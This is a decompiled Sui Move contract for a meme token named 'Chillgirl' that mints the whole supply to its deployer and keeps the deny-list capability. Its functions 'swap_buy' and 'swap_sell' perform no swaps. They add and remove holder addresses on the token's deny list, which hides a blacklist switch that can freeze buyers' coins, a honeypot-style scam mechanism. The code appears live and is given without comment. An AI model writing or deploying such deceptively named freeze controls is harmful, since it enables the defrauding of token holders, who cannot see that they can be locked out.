module 0x8a252588e7082653ad9e342a832ad90b7b6a08c4d963400b174c2d095e1d7::chillgirl {
    struct CHILLGIRL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLGIRL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLGIRL>(arg0, 9, b"Chillgirl", b"Chillgirl", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmdShrNwuFKFjkSceYd4TtQrYEqnPZXw6d93AmL83MvQwh"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLGIRL>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLGIRL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLGIRL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLGIRL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGIRL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLGIRL>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGIRL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLGIRL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

